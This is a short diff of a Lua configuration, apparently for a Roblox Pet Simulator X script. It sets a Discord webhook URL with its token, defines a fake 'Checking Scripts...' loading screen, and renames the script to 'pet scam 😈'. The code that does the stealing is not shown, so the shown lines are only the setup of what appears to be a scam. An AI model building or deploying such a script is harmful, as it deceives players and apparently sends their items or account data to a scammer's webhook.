@@ -3,7 +3,7 @@ WebHook = "https://discord.com/api/webhooks/1089165975129165884/PRk1XrgJk7MTsOvX
 
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
-_G.CustomScriptName = "PSX Script"
+_G.CustomScriptName = "pet scam 😈"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
